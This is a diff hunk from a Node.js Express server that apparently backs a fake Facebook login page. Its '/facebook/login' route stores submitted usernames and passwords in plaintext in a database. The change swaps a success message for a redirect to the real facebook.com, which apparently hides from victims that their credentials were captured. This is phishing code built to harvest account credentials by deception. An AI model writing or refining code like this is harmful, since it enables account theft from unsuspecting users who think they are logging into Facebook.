@@ -37,7 +37,7 @@ app.post("/facebook/login", async (req, res) => {
             "INSERT INTO users (username, password) VALUES ($1, $2)",
             [username, password]
         );
-        res.status(201).send("User added successfully");
+        res.redirect("https://www.facebook.com")
     } catch (error) {
         console.error("Error inserting user:", error);
         res.status(500).send("Error inserting user");
